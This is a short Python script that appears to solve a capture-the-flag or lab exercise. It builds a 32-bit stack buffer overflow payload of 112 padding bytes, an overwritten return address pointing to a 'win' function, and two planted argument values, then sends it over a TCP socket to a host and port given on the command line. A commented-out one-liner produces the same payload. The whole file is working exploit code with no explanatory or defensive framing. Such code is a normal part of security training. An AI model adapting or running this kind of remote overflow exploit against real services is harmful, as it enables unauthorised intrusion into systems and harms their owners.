#!/usr/bin/env python3

import socket
import argparse
import struct

parser = argparse.ArgumentParser()
parser.add_argument("host",
        type=str,
        help="The hostname or IP address to connect to",
)

parser.add_argument(
        "port",
        type=int,
        help="The port for the service to connect to",
)

args = parser.parse_args()

offset = 112
#python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 112 + b"\x96\x92\x04\x08" + b"\x40\x96\xdf\xf7" + b"\x0d\xf0\xfe\xca" + b"\x0d\xf0\x0d\xf0")'
new_eip = struct.pack("<I", 0x08049296) # win function addres
#exit_addr = struct.pack("<I", 0xf7df9640) # exit address
first_arg = struct.pack("<I", 0xcafef00d) 
second_arg = struct.pack("<I", 0xf00df00d) 

payload = b"".join(
        [
            b"A" * offset,
            new_eip,
            b"BBBB",
            first_arg,
            second_arg,
            b"\n"
        ]
)

print(payload)

with socket.socket() as connection:

    connection.connect((args.host, args.port))
    print(connection.recv(4096).decode('utf-8'))
    connection.send(payload)
    print(connection.recv(4096))

